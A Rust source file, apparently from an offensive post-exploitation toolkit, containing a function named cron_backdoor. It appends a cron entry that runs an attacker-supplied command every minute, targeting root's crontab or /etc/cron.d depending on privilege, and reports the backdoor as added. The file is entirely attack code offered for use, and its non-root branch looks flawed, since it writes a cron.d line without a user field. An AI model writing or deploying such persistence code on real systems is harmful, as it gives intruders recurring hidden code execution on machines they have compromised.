use std::fs::OpenOptions;
use std::io::Write;
use nix::unistd::Uid;
use crate::ui::print_success;

pub fn cron_backdoor(name: String, command: String) {
    let root = Uid::effective().is_root();
    let path: String = match root {
        true => "/var/spool/cron/root".to_string(),
        false => format!("/etc/cron.d/{name}")
    };

    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(path.clone())
        .expect(format!("Failed to open {path}").as_str());

    file.write_all(format!("* * * * * {command}\n").as_bytes()).expect(format!("Failed to write to {path}").as_str());
    print_success(format!("Backdoor added to {path}"));
}